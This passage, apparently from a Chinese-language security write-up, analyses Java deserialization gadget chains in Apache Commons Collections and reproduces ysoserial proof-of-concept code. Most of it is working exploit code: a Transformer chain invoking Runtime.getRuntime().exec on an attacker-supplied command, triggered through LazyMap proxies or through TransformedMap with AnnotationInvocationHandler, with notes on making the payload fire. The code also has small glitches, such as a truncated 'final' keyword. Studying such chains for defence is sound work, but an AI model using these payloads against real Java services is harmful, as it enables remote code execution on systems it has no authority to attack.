    return object;
    }
transform(object)中传入的object是一前一个transform(object)，最终构造如下:
    final Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
    String.class, Class[].class
    }
    , new Object[]{
        "getRuntime", new Class[0]
    }
    ),
        new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class
    }
    , new Object[]{
        null, new Object[0]
    }
    ),
        new InvokerTransformer("exec",
        new Class[]{
        String.class
    }
    , execArgs),
        new ConstantTransformer(1)
    }
    ;
ysoserial中完整的poc如下:
    inal String[] execArgs = new String[] { command };
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1)
    }
    );
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {
    String.class, Class[].class
    }
    , new Object[] {
    "getRuntime", new Class[0]
    }
    ),
        new InvokerTransformer("invoke", new Class[] {
    Object.class, Object[].class
    }
    , new Object[] {
    null, new Object[0]
    }
    ),
        new InvokerTransformer("exec",
        new Class[] {
    String.class
    }
    , execArgs),
        new ConstantTransformer(1)
    }
    ;
    final Map innerMap = new HashMap();
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
    // arm with actual transformer chain
    return handler;
其实通过分析可以找到很多调用链的，比如  
InvokerTransformer.transform()->TransformedMap.checkSetValue()->AbstractInputCheckedMapDecorator.setValue()->TreeMap.put()->CoreDocumentImpl.readObject()
还有一种比较简单的调用，直接是  
InvokerTransformer.transform()->TransformedMap.checkSetValue()->AbstractInputCheckedMapDecorator.setValue()->AnnotationInvocationHandler.readObject()
### 情况2(TransformedMap.checkSetValue)
下面针对InvokerTransformer.transform()->TransformedMap.checkSetValue()->AbstractInputCheckedMapDecorator.setValue()->AnnotationInvocationHandler.readObject()  
这条调用链来构造poc:
    Map map = new HashMap();
    Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
    InvocationHandler handler = (InvocationHandler) getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Retention.class, transformedmap);
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
到这里并没有成功弹出计算器，当执行到AnnotationInvocationHandler.readObject()时，下面这段代码不会执行。
    for (Map.Entry memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Class memberType = memberTypes.get(name);
    if (memberType != null) {
        // i.e. member still exists
        Object value = memberValue.getValue();
        if (!(memberType.isInstance(value) ||
            value instanceof ExceptionProxy)) {
            memberValue.setValue(
                new AnnotationTypeMismatchExceptionProxy(
                value.getClass() + "[" + value + "]").setMember(
                annotationType.members().get(name)));
要其执行要满足两个条件,memberValues不能为空，并且memberType不能为空  
String name = memberValue.getKey();  
Class memberType = memberTypes.get(name);  
memberTypes是Retention，查找下注释Retention中的成员，发现有一个value。  
那么memberValues只需要put一个键值对，其键为value即可，memberValues.put('value', 'xxx'),完整poc如下:
    public InvocationHandler getObject(final String command) throws Exception {
    final String[] execArgs = new String[]{command};
    // inert chain for setup
    // real chain for after setup
    final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class
    }
    , new Object[]{
        "getRuntime", new Class[0]
    }
    ),
        new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class
    }
    , new Object[]{
        null, new Object[0]
    }
    ),
        new InvokerTransformer("exec",
        new Class[]{
        String.class
    }
    , execArgs),
        new ConstantTransformer(1)
    }
    ;
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{new ConstantTransformer(1)
    }
    );
    //Transformer transformerChain = new ChainedTransformer(transformers);
    Map map = new HashMap();
    Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
    transformedmap.put("value", "xx");
    Class cls = Class
        .forName("sun.reflect.annotation.AnnotationInvocationHandler");
    InvocationHandler handler = (InvocationHandler) getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Retention.class, transformedmap);
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
    return handler;
    }
    public static void main(final String[] args) throws Exception {
    PayloadRunner.run(CommonsCollections7.class, args);
    }
    public static Boolean isApplicableJavaVersion() {
    return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
    public static Constructor getFirstCtor(final String name)
        throws Exception {
    final Constructor ctor = Class.forName(name)
        .getDeclaredConstructors()[0];
    ctor.setAccessible(true);
    return ctor;
    }
    public static Field getField(Class clazz, String fieldName) throws NoSuchFieldException {
    Field field = clazz.getDeclaredField(fieldName);
    if (field != null)
        field.setAccessible(true); else if (clazz.getSuperclass() != null)
        field = getField(clazz.getSuperclass(), fieldName);
    field.setAccessible(true);
    return field;
    }
    public static void setField(Object object, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
    Field field = getField(object.getClass(), fieldName);
    field.set(fieldName, value);
    }
## 参考链接
[https://github.com/frohoff/ysoserial]()